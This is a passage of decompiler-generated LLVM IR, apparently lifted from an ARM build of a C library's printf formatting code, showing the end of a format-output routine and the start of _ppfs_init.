  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sl, align 4
  store i32 %v2_14820, i32* @r4, align 4
  %v1_14b74 = trunc i32 %v0_14b64 to i8
  %v2_14b74 = load i32, i32* @fp, align 4
  %v4_14b74 = add i32 %v2_14b74, %v5_14b54
  %v5_14b74 = inttoptr i32 %v4_14b74 to i8*
  store i8 %v1_14b74, i8* %v5_14b74, align 1
  %v0_14cb0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14cacthread-pre-split

dec_label_pc_14b7c:                               ; preds = %dec_label_pc_14af8
  br i1 %v3_14b80, label %dec_label_pc_14c14, label %dec_label_pc_14b84

dec_label_pc_14b84:                               ; preds = %dec_label_pc_14b7c
  %v3_14b84 = load i32, i32* %stack_var_-68, align 4
  store i32 %v3_14b84, i32* %r0.global-to-local, align 4
  %v1_14b8c = inttoptr i32 %v3_14b84 to i32*
  %v2_14b8c = load i32, i32* %v1_14b8c, align 4
  br i1 %v7_14b7c, label %dec_label_pc_14b8c, label %dec_label_pc_14bec

dec_label_pc_14b8c:                               ; preds = %dec_label_pc_14b84
  store i32 %v2_14b8c, i32* @r4, align 4
  %v2_14b90 = icmp eq i32 %v2_14b8c, 0
  br i1 %v2_14b90, label %dec_label_pc_14bbc, label %dec_label_pc_14b98

dec_label_pc_14b98:                               ; preds = %dec_label_pc_14b8c, %dec_label_pc_14c1c
  %v0_14b9c = phi i32 [ %v2_14b8c, %dec_label_pc_14b8c ], [ %v3_14c2c, %dec_label_pc_14c1c ]
  %v3_14b98 = load i32, i32* %stack_var_-344, align 4
  store i32 %v0_14b9c, i32* %r0.global-to-local, align 4
  %v4_14ba0 = ashr i32 %v3_14b98, 31
  %v5_14ba0 = or i32 %v4_14ba0, %v3_14b98
  %v2_14ba4 = inttoptr i32 %v0_14b9c to i8*
  %v3_14ba4 = call i32 @strnlen(i8* %v2_14ba4, i32 %v5_14ba0)
  store i32 %v3_14ba4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v3_14ba4, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sl, align 4
  br label %dec_label_pc_14cac

dec_label_pc_14bbc:                               ; preds = %dec_label_pc_14b8c, %dec_label_pc_14b10
  %v3_14bbc = load i32, i32* %stack_var_-344, align 4
  store i32 %v3_14bbc, i32* %r0.global-to-local, align 4
  %v1_14bc0 = icmp slt i32 %v3_14bbc, 0
  br i1 %v1_14bc0, label %.thread85, label %dec_label_pc_14bcc

.thread85:                                        ; preds = %dec_label_pc_14bbc
  store i32 6, i32* @r5, align 4
  br label %bb161

dec_label_pc_14bcc:                               ; preds = %dec_label_pc_14bbc
  %v2_14bcc = icmp ugt i32 %v3_14bbc, 4
  %v7_14bcc = icmp eq i32 %v3_14bbc, 5
  %v2_14bd0 = xor i1 %v7_14bcc, true
  %v3_14bd0 = and i1 %v2_14bcc, %v2_14bd0
  br i1 %v3_14bd0, label %bb158, label %bb159

bb158:                                            ; preds = %dec_label_pc_14bcc
  store i32 6, i32* @r5, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_14bcc, %bb158
  %v2_14bd4 = xor i1 %v2_14bcc, true
  %v3_14bd4 = or i1 %v7_14bcc, %v2_14bd4
  br i1 %v3_14bd4, label %bb160, label %bb161

bb160:                                            ; preds = %bb159
  store i32 0, i32* @r5, align 4
  br label %bb161

bb161:                                            ; preds = %.thread85, %bb159, %bb160
  store i32 ptrtoint ([7 x i8]* @global_var_24688.1343 to i32), i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sl, align 4
  br label %dec_label_pc_14cac

dec_label_pc_14bec:                               ; preds = %dec_label_pc_14b84
  store i32 %v2_14b8c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sl, align 4
  store i32 %v2_14820, i32* @r4, align 4
  store i32 %v2_14b8c, i32* %stack_var_-196, align 4
  br label %dec_label_pc_14cac

dec_label_pc_14c14:                               ; preds = %dec_label_pc_14b7c
  br i1 %v7_14c14, label %dec_label_pc_14c1c, label %dec_label_pc_14c38

dec_label_pc_14c1c:                               ; preds = %dec_label_pc_14c14
  %v0_14c1c = call i32 @__GI___errno_location()
  store i32 %v0_14c1c, i32* %r0.global-to-local, align 4
  %v1_14c24 = inttoptr i32 %v0_14c1c to i32*
  %v2_14c24 = load i32, i32* %v1_14c24, align 4
  store i32 %v2_14c24, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_14c2c = call i32 @__GI___glibc_strerror_r(i32 %v2_14c24, i32 %v2_14820, i32 128)
  store i32 %v3_14c2c, i32* %r0.global-to-local, align 4
  store i32 %v3_14c2c, i32* @r4, align 4
  br label %dec_label_pc_14b98

dec_label_pc_14c38:                               ; preds = %dec_label_pc_14c14
  store i32 ptrtoint (i32** @global_var_2e32c.1346 to i32), i32* %r2.global-to-local, align 4
  %v2_14c3c = load i32, i32* bitcast (i32** @global_var_2e32c.1346 to i32*), align 4
  store i32 %v2_14c3c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e336.1347 to i32), i32* %r0.global-to-local, align 4
  %v0_14c5c = load i32, i32* @sb, align 4
  store i32 %v0_14c5c, i32* %r0.global-to-local, align 4
  store i32 %v2_14c64, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_346ec.1349 to i32), i32* %ip.global-to-local, align 4
  store i32 85108, i32* @lr, align 4
  %v7_14c70 = load i32, i32* @global_var_346ec.1349, align 4
  call void @__pseudo_branch(i32 %v7_14c70)
  %v0_14c74 = load i32, i32* %r0.global-to-local, align 4
  %v1_14c74 = icmp slt i32 %v0_14c74, 0
  br i1 %v1_14c74, label %dec_label_pc_14df4, label %dec_label_pc_14c7c

dec_label_pc_14c7c:                               ; preds = %dec_label_pc_14c38
  %v2_14c80 = add i32 %v0_14c74, %v1_14cdc
  store i32 %v2_14c80, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14de0

dec_label_pc_14c9c:                               ; preds = %dec_label_pc_14b20
  %v0_14c9c = load i32, i32* @r8, align 4
  store i32 %v0_14c9c, i32* @r7, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sl, align 4
  store i32 %v0_14c9c, i32* @r4, align 4
  br label %dec_label_pc_14cac

dec_label_pc_14cacthread-pre-split:               ; preds = %.thread83, %dec_label_pc_14ab4, %dec_label_pc_14b64
  %v0_14cb0.pre = phi i32 [ 0, %dec_label_pc_14ab4 ], [ %v0_14cb0.pre.pre, %dec_label_pc_14b64 ], [ %v2_14aa8, %.thread83 ]
  %stack_var_-332.3.ph = phi i32 [ %v0_14a34, %dec_label_pc_14ab4 ], [ %v0_14964, %dec_label_pc_14b64 ], [ %v0_14a34, %.thread83 ]
  %v0_14cac.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_14cac

dec_label_pc_14cac:                               ; preds = %dec_label_pc_14cacthread-pre-split, %dec_label_pc_14bec, %bb161, %dec_label_pc_14b98, %dec_label_pc_14c9c
  %v1_14cf0 = phi i32 [ %v0_14cb0.pre, %dec_label_pc_14cacthread-pre-split ], [ 0, %dec_label_pc_14bec ], [ 0, %bb161 ], [ 0, %dec_label_pc_14b98 ], [ %v0_14c9c, %dec_label_pc_14c9c ]
  %v0_14cb8 = phi i32 [ %v0_14cac.pr, %dec_label_pc_14cacthread-pre-split ], [ 11, %dec_label_pc_14bec ], [ 11, %bb161 ], [ 11, %dec_label_pc_14b98 ], [ 11, %dec_label_pc_14c9c ]
  %v0_14cf8 = phi i32 [ %stack_var_-332.3.ph, %dec_label_pc_14cacthread-pre-split ], [ %v0_14964, %dec_label_pc_14bec ], [ %v0_14964, %bb161 ], [ %v0_14964, %dec_label_pc_14b98 ], [ %v0_14964, %dec_label_pc_14c9c ]
  %v7_14cac = icmp eq i32 %v0_14cb8, 11
  %v1_14cb0 = load i32, i32* @r5, align 4
  %v2_14cb0 = add i32 %v1_14cb0, %v1_14cf0
  br i1 %v7_14cac, label %dec_label_pc_14cc8, label %bb162

bb162:                                            ; preds = %dec_label_pc_14cac
  %v7_14cc0 = icmp sgt i32 %v0_14cb8, 5
  %. = select i1 %v7_14cc0, i32 2, i32 1
  %v2_14cc4 = add i32 %v2_14cb0, %.
  br label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14cac, %bb162
  %v0_14cdc = phi i32 [ %v2_14cb0, %dec_label_pc_14cac ], [ %v2_14cc4, %bb162 ]
  store i32 %tmp91, i32* %r2.global-to-local, align 4
  store i32 %v1_14cdc, i32* %ip.global-to-local, align 4
  %v2_14cd0 = sub i32 %tmp91, %v0_14cdc
  %v3_14cd0 = icmp uge i32 %tmp91, %v0_14cdc
  %v9_14cd0 = icmp eq i32 %tmp91, %v0_14cdc
  %v2_14cd4 = xor i1 %v3_14cd0, true
  %v3_14cd4 = or i1 %v9_14cd0, %v2_14cd4
  br i1 %v3_14cd4, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_14cc8
  store i32 0, i32* @r8, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_14cc8, %bb163
  %v2_14cd8 = xor i1 %v9_14cd0, true
  %v3_14cd8 = and i1 %v3_14cd0, %v2_14cd8
  br i1 %v3_14cd8, label %bb165, label %._crit_edge

._crit_edge:                                      ; preds = %bb164
  %v1_14ce0.pre = load i32, i32* @r8, align 4
  br label %bb166

bb165:                                            ; preds = %bb164
  store i32 %v2_14cd0, i32* @r8, align 4
  br label %bb166

bb166:                                            ; preds = %._crit_edge, %bb165
  %v2_14cf0 = phi i32 [ %v1_14ce0.pre, %._crit_edge ], [ %v2_14cd0, %bb165 ]
  %v2_14cdc = add i32 %v0_14cdc, %v1_14cdc
  %v2_14ce0 = add i32 %v2_14cdc, %v2_14cf0
  %v0_14cec = load i32, i32* @sl, align 4
  %v7_14cec = icmp eq i32 %v0_14cec, 48
  br i1 %v7_14cec, label %bb167, label %.thread28

bb167:                                            ; preds = %bb166
  %v3_14cf0 = add i32 %v2_14cf0, %v1_14cf0
  store i32 %v3_14cf0, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  br label %.thread28

.thread28:                                        ; preds = %bb166, %bb167
  %v0_14d08 = phi i32 [ %v2_14cf0, %bb166 ], [ 0, %bb167 ]
  %v1_14cf8 = and i32 %v0_14cf8, 8
  store i32 %v1_14cf8, i32* @sl, align 4
  %v2_14cf8 = icmp eq i32 %v1_14cf8, 0
  br i1 %v2_14cf8, label %dec_label_pc_14d00, label %dec_label_pc_14d1c

dec_label_pc_14d00:                               ; preds = %.thread28
  %v0_14d00 = load i32, i32* @sb, align 4
  store i32 %v0_14d00, i32* %r0.global-to-local, align 4
  store i32 %v0_14d08, i32* %r2.global-to-local, align 4
  %v4_14d0c = call i32 @_charpad(i32 %v0_14d00, i8 32, i32 %v0_14d08)
  store i32 %v4_14d0c, i32* %r0.global-to-local, align 4
  %v1_14d10 = load i32, i32* @r8, align 4
  %v9_14d10 = icmp eq i32 %v4_14d0c, %v1_14d10
  br i1 %v9_14d10, label %dec_label_pc_14d18, label %dec_label_pc_14df4

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14d00
  %v0_14d18 = load i32, i32* @sl, align 4
  store i32 %v0_14d18, i32* @r8, align 4
  %v0_14d24.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14d1c

dec_label_pc_14d1c:                               ; preds = %.thread28, %dec_label_pc_14d18
  %v0_14d24 = phi i32 [ %v0_14cb8, %.thread28 ], [ %v0_14d24.pre, %dec_label_pc_14d18 ]
  store i32 ptrtoint (i32* @global_var_24690.1351 to i32), i32* %r2.global-to-local, align 4
  %v0_14d20 = load i32, i32* @sb, align 4
  %v2_14d24 = add i32 %v0_14d24, ptrtoint (i32* @global_var_24690.1351 to i32)
  store i32 %v2_14d24, i32* %r0.global-to-local, align 4
  %v3_14d28 = inttoptr i32 %v2_14d24 to i8*
  %v4_14d28 = call i32 @__GI_fputs_unlocked(i8* %v3_14d28, i32 %v0_14d20, i32 ptrtoint (i32* @global_var_24690.1351 to i32))
  %v0_14d2c = load i32, i32* @sb, align 4
  store i32 %v0_14d2c, i32* %r0.global-to-local, align 4
  %v0_14d34 = load i32, i32* @r7, align 4
  store i32 %v0_14d34, i32* %r2.global-to-local, align 4
  %v4_14d38 = call i32 @_charpad(i32 %v0_14d2c, i8 48, i32 %v0_14d34)
  store i32 %v4_14d38, i32* %r0.global-to-local, align 4
  %v1_14d3c = load i32, i32* @r7, align 4
  %v9_14d3c = icmp eq i32 %v4_14d38, %v1_14d3c
  br i1 %v9_14d3c, label %dec_label_pc_14d44, label %dec_label_pc_14df4

dec_label_pc_14d44:                               ; preds = %dec_label_pc_14d1c
  %v3_14d44 = load i32, i32* %stack_var_-40, align 4
  %v2_14d48 = icmp eq i32 %v3_14d44, 0
  br i1 %v2_14d48, label %dec_label_pc_14d58, label %dec_label_pc_14db4thread-pre-split

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d44
  %v0_14d58 = load i32, i32* @r5, align 4
  %v2_14d58 = icmp eq i32 %v0_14d58, 0
  br i1 %v2_14d58, label %dec_label_pc_14dc8, label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d58
  %v0_14d60 = load i32, i32* @r4, align 4
  store i32 %v0_14d60, i32* %r0.global-to-local, align 4
  %v0_14d68 = load i32, i32* @sb, align 4
  store i32 %v0_14d68, i32* %r2.global-to-local, align 4
  %v4_14d6c = inttoptr i32 %v0_14d68 to i8*
  %v5_14d6c = call i32 @__stdio_fwrite(i32 %v0_14d60, i32 %v0_14d58, i8* %v4_14d6c)
  store i32 %v5_14d6c, i32* %r0.global-to-local, align 4
  %v1_14d70 = load i32, i32* @r5, align 4
  %v9_14d70 = icmp eq i32 %v5_14d6c, %v1_14d70
  br i1 %v9_14d70, label %dec_label_pc_14dc8, label %dec_label_pc_14df4

dec_label_pc_14d7c:                               ; preds = %dec_label_pc_14db4thread-pre-split, %dec_label_pc_14db0
  %v1_14d80 = phi i32 [ %v2_14db0, %dec_label_pc_14db0 ], [ %v0_14db4.pr, %dec_label_pc_14db4thread-pre-split ]
  %v2_14d7c = icmp ult i32 %v1_14d80, 128
  %.v1_14d80 = select i1 %v2_14d7c, i32 %v1_14d80, i32 128
  store i32 %.v1_14d80, i32* %r2.global-to-local, align 4
  %v6_14d88 = call i32 @__GI_wcsrtombs(i32 %v2_14820, i32 %v2_14b24, i32 %.v1_14d80, i32 %v2_14b30, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_14d88, i32* @r4, align 4
  %v2_14d8c = icmp eq i32 %v6_14d88, 0
  store i32 %v6_14d88, i32* %r0.global-to-local, align 4
  br i1 %v2_14d8c, label %dec_label_pc_14db0, label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14d7c
  store i32 %v2_14820, i32* %r0.global-to-local, align 4
  %v0_14da0 = load i32, i32* @sb, align 4
  store i32 %v0_14da0, i32* %r2.global-to-local, align 4
  %v3_14da4 = inttoptr i32 %v0_14da0 to i8*
  %v4_14da4 = call i32 @__stdio_fwrite(i32 %v2_14820, i32 %v6_14d88, i8* %v3_14da4)
  store i32 %v4_14da4, i32* %r0.global-to-local, align 4
  %v1_14da8 = load i32, i32* @r4, align 4
  %v9_14da8 = icmp eq i32 %v4_14da4, %v1_14da8
  br i1 %v9_14da8, label %dec_label_pc_14db0, label %dec_label_pc_14df4

dec_label_pc_14db0:                               ; preds = %dec_label_pc_14d98, %dec_label_pc_14d7c
  %v0_14db0 = phi i32 [ %v4_14da4, %dec_label_pc_14d98 ], [ 0, %dec_label_pc_14d7c ]
  %v1_14db0 = load i32, i32* @r5, align 4
  %v2_14db0 = sub i32 %v1_14db0, %v0_14db0
  store i32 %v2_14db0, i32* @r5, align 4
  %v2_14db4 = icmp eq i32 %v2_14db0, 0
  store i32 %v2_14b24, i32* @r1, align 4
  store i32 %v2_14820, i32* @r0, align 4
  br i1 %v2_14db4, label %dec_label_pc_14dc8, label %dec_label_pc_14d7c

dec_label_pc_14db4thread-pre-split:               ; preds = %dec_label_pc_14d44
  store i32 0, i32* %stack_var_-48, align 4
  %v0_14db4.pr = load i32, i32* @r5, align 4
  %v2_14db440 = icmp eq i32 %v0_14db4.pr, 0
  store i32 %v2_14b24, i32* @r1, align 4
  store i32 %v2_14820, i32* @r0, align 4
  br i1 %v2_14db440, label %dec_label_pc_14dc8, label %dec_label_pc_14d7c

dec_label_pc_14dc8:                               ; preds = %dec_label_pc_14db0, %dec_label_pc_14db4thread-pre-split, %dec_label_pc_14d60, %dec_label_pc_14d58
  %v0_14dc8 = load i32, i32* @sb, align 4
  store i32 %v0_14dc8, i32* %r0.global-to-local, align 4
  %v0_14dd0 = load i32, i32* @r8, align 4
  store i32 %v0_14dd0, i32* %r2.global-to-local, align 4
  %v4_14dd4 = call i32 @_charpad(i32 %v0_14dc8, i8 32, i32 %v0_14dd0)
  store i32 %v4_14dd4, i32* %r0.global-to-local, align 4
  %v1_14dd8 = load i32, i32* @r8, align 4
  %v9_14dd8 = icmp eq i32 %v4_14dd4, %v1_14dd8
  br i1 %v9_14dd8, label %dec_label_pc_14de0, label %dec_label_pc_14df4

dec_label_pc_14de0:                               ; preds = %dec_label_pc_14dc8, %dec_label_pc_14c7c, %dec_label_pc_14ae8, %dec_label_pc_14910
  %stack_var_-332.4 = phi i32 [ %v0_14964, %dec_label_pc_14910 ], [ %v0_14cf8, %dec_label_pc_14dc8 ], [ %v0_14964, %dec_label_pc_14c7c ], [ %v0_14964, %dec_label_pc_14ae8 ]
  %stack_var_-352.3 = phi i32 [ %v1_14cdc, %dec_label_pc_14910 ], [ %v2_14ce0, %dec_label_pc_14dc8 ], [ %v2_14c80, %dec_label_pc_14c7c ], [ %v2_14aec, %dec_label_pc_14ae8 ]
  %v3_14de0 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_14de0, i32* @r4, align 4
  store i32 %v3_14de0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14838.outer

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14894
  %v1_14dec = add i32 %v0_1489c, 2
  store i32 %v1_14dec, i32* @r4, align 4
  br label %dec_label_pc_14838.outer35

dec_label_pc_14df4:                               ; preds = %dec_label_pc_14b20, %dec_label_pc_14dc8, %dec_label_pc_14d60, %dec_label_pc_14d1c, %dec_label_pc_14d00, %dec_label_pc_14c38, %dec_label_pc_14b48, %dec_label_pc_14ac4, %bb127, %dec_label_pc_14d98, %dec_label_pc_14808
  br label %dec_label_pc_14dfc

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14888, %bb, %dec_label_pc_14df4
  %stack_var_-352.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_14df4 ], [ %v1_14cdc, %dec_label_pc_14888 ]
  store i32 %stack_var_-352.4, i32* %r0.global-to-local, align 4
  store i32 %v6_147c4, i32* @r5, align 4
  store i32 %v9_147c4, i32* @r6, align 4
  store i32 %v18_147c4, i32* @sb, align 4
  store i32 %v21_147c4, i32* @sl, align 4
  store i32 %v24_147c4, i32* @fp, align 4
  ret i32 %stack_var_-352.4

; uselistorder directives
  uselistorder i32 %stack_var_-352.4, { 1, 0 }
  uselistorder i32 %v1_14dec, { 1, 0 }
  uselistorder i32 %v3_14de0, { 1, 2, 0 }
  uselistorder i32 %v0_14db4.pr, { 1, 0 }
  uselistorder i32 %v2_14db0, { 1, 2, 0 }
  uselistorder i32 %v0_14d08, { 1, 0 }
  uselistorder i32 %v2_14cf0, { 2, 0, 1 }
  uselistorder i1 %v3_14cd0, { 1, 0 }
  uselistorder i32 %v0_14cdc, { 0, 2, 3, 1 }
  uselistorder i32 %v2_14cb0, { 1, 0 }
  uselistorder i32 %v0_14cf8, { 1, 0 }
  uselistorder i32 %v3_14c2c, { 1, 2, 0 }
  uselistorder i1 %v7_14bcc, { 1, 0 }
  uselistorder i32 %v0_14b9c, { 1, 0 }
  uselistorder i32 %v2_14b8c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_14b54, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14b10, { 2, 0, 1, 3 }
  uselistorder i32 %v3_14acc, { 1, 0 }
  uselistorder i32 %v2_14a3c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_14a58, { 1, 2, 3, 0 }
  uselistorder i32 %v6_149dc, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_14944, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v1_148f0.pre, { 1, 0, 2 }
  uselistorder i32 %v1_148e8, { 1, 0 }
  uselistorder i32 %v1_14894, { 0, 1, 3, 2 }
  uselistorder i32 %v1_14cdc, { 0, 7, 1, 6, 2, 3, 5, 4, 8, 9 }
  uselistorder i32 %v2_14854, { 1, 0 }
  uselistorder i32 %v1_1484c.lcssa, { 1, 0 }
  uselistorder i8 %v2_14838, { 1, 0 }
  uselistorder i32 %v2_1484c, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-352.1.ph36, { 1, 0 }
  uselistorder i32 %v5_14864, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14964, { 4, 3, 2, 16, 15, 14, 13, 0, 12, 11, 10, 6, 9, 7, 1, 5, 8 }
  uselistorder i1 %v7_14a50, { 1, 0 }
  uselistorder i1 %v7_149a4, { 1, 2, 0 }
  uselistorder i1 %v7_14b7c, { 1, 0 }
  uselistorder i1 %v7_14af8, { 1, 0 }
  uselistorder i1 %v7_149e4, { 1, 0 }
  uselistorder i32 %v2_14b30, { 0, 2, 1, 3 }
  uselistorder i32 %v2_14b24, { 2, 0, 1, 5, 3, 4, 6 }
  uselistorder i32 %v2_148ec, { 1, 3, 2, 0 }
  uselistorder i32 %v4_148c8, { 1, 0 }
  uselistorder i32 %v2_14820, { 0, 4, 3, 2, 1, 9, 8, 5, 7, 6, 10 }
  uselistorder i32 %v2_147cc, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp97, { 1, 2, 0 }
  uselistorder i32 %tmp96, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp91, { 2, 1, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 22, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 23, 24, 25, 27, 26, 3, 28, 29, 30, 31, 32, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 8, 6, 7, 10, 9, 11, 13, 12, 18, 14, 15, 16, 17, 19, 21, 20, 24, 22, 23, 26, 25, 28, 27, 30, 29, 32, 31, 35, 33, 34, 38, 39, 36, 37, 40, 41, 1, 2, 43, 42, 45, 44, 47, 46, 49, 48, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_14dfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14df4, { 1, 9, 2, 3, 4, 5, 6, 0, 7, 8, 10 }
  uselistorder label %dec_label_pc_14dc8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14d1c, { 1, 0 }
  uselistorder label %.thread28, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_14cc8, { 1, 0 }
  uselistorder label %dec_label_pc_14cac, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_14cacthread-pre-split, { 2, 1, 0 }
  uselistorder label %bb161, { 2, 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %dec_label_pc_14b98, { 1, 0 }
  uselistorder label %dec_label_pc_14ab4, { 0, 2, 1 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %bb154, { 4, 1, 2, 0, 3 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %bb149, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %bb145, { 4, 3, 1, 0, 2 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_14994, { 1, 0 }
  uselistorder label %dec_label_pc_14990, { 2, 1, 0 }
  uselistorder label %bb136, { 2, 1, 0 }
  uselistorder label %dec_label_pc_148e4, { 1, 0 }
  uselistorder label %bb131, { 1, 0 }
  uselistorder label %dec_label_pc_14888, { 1, 0 }
  uselistorder label %bb127, { 1, 0 }
  uselistorder label %dec_label_pc_14854, { 1, 0, 2 }
  uselistorder label %bb123, { 1, 0 }
  uselistorder label %dec_label_pc_14838.outer35, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_14e24 = load i32, i32* @r4, align 4
  store i32 %v3_14e24, i32* %stack_var_-12, align 4
  %v6_14e24 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14e30 = load i32, i32* @r1, align 4
  store i32 %v0_14e30, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14e38 = bitcast i32* %arg1 to i8*
  %v3_14e38 = call i32 @__GI_memset(i8* %v2_14e38, i32 0)
  %v0_14e3c = load i32, i32* @r4, align 4
  %v1_14e3c = add i32 %v0_14e3c, 24
  %v2_14e3c = inttoptr i32 %v1_14e3c to i32*
  %v3_14e3c = load i32, i32* %v2_14e3c, align 4
  store i32 %v3_14e3c, i32* %r3.global-to-local, align 4
  %v0_14e40 = load i32, i32* @r5, align 4
  %v2_14e40 = inttoptr i32 %v0_14e3c to i32*
  store i32 %v0_14e40, i32* %v2_14e40, align 4
  %v0_14e44 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e44 = add i32 %v0_14e44, -1
  %v1_14e48 = load i32, i32* @r4, align 4
  %v2_14e48 = add i32 %v1_14e48, 24
  %v3_14e48 = inttoptr i32 %v2_14e48 to i32*
  store i32 %v1_14e44, i32* %v3_14e48, align 4
  %v0_14e4c = load i32, i32* @r4, align 4
  %v1_14e4c = add i32 %v0_14e4c, 40
  store i32 %v1_14e4c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_14e5c20 = inttoptr i32 %v1_14e4c to i32*
  store i32 8, i32* %v2_14e5c20, align 4
  %v3_14e5c21 = load i32, i32* %r2.global-to-local, align 4
  %v4_14e5c22 = add i32 %v3_14e5c21, 4
  store i32 %v4_14e5c22, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e58.dec_label_pc_14e58_crit_edge

dec_label_pc_14e58.dec_label_pc_14e58_crit_edge:  ; preds = %entry, %dec_label_pc_14e58.dec_label_pc_14e58_crit_edge
  %v4_14e5c23 = phi i32 [ %v4_14e5c22, %entry ], [ %v4_14e5c, %dec_label_pc_14e58.dec_label_pc_14e58_crit_edge ]
  %v0_14e58.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14e5c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14e58 = add i32 %v0_14e58.pre, -1
  store i32 %v1_14e58, i32* %r3.global-to-local, align 4
  %v7_14e58 = icmp eq i32 %v0_14e58.pre, 1
  %v2_14e5c = inttoptr i32 %v4_14e5c23 to i32*
  store i32 %v0_14e5c.pre, i32* %v2_14e5c, align 4
  %v3_14e5c = load i32, i32* %r2.global-to-local, align 4
  %v4_14e5c = add i32 %v3_14e5c, 4
  store i32 %v4_14e5c, i32* %r2.global-to-local, align 4
  br i1 %v7_14e58, label %dec_label_pc_14e64, label %dec_label_pc_14e58.dec_label_pc_14e58_crit_edge

dec_label_pc_14e64:                               ; preds = %dec_label_pc_14e58.dec_label_pc_14e58_crit_edge
  %v0_14e64 = load i32, i32* @r5, align 4
  store i32 %v0_14e64, i32* %r2.global-to-local, align 4
  %v1_14ea83 = inttoptr i32 %v0_14e64 to i8*
  %v2_14ea84 = load i8, i8* %v1_14ea83, align 1
  %v2_14eac6 = icmp eq i8 %v2_14ea84, 0
  br i1 %v2_14eac6, label %dec_label_pc_14eb4, label %dec_label_pc_14e6c

dec_label_pc_14e6c:                               ; preds = %dec_label_pc_14e64, %dec_label_pc_14ea8.backedge
  %v0_14e74 = phi i32 [ %storemerge, %dec_label_pc_14ea8.backedge ], [ %v0_14e64, %dec_label_pc_14e64 ]
  %v2_14ea87 = phi i8 [ %v2_14ea8, %dec_label_pc_14ea8.backedge ], [ %v2_14ea84, %dec_label_pc_14e64 ]
  %v7_14e6c = icmp eq i8 %v2_14ea87, 37
  br i1 %v7_14e6c, label %dec_label_pc_14e74, label %dec_label_pc_14ea4

dec_label_pc_14e74:                               ; preds = %dec_label_pc_14e6c
  %v1_14e74 = add i32 %v0_14e74, 1
  %v2_14e74 = inttoptr i32 %v1_14e74 to i8*
  %v3_14e74 = load i8, i8* %v2_14e74, align 1
  %v4_14e74 = zext i8 %v3_14e74 to i32
  store i32 %v4_14e74, i32* %r3.global-to-local, align 4
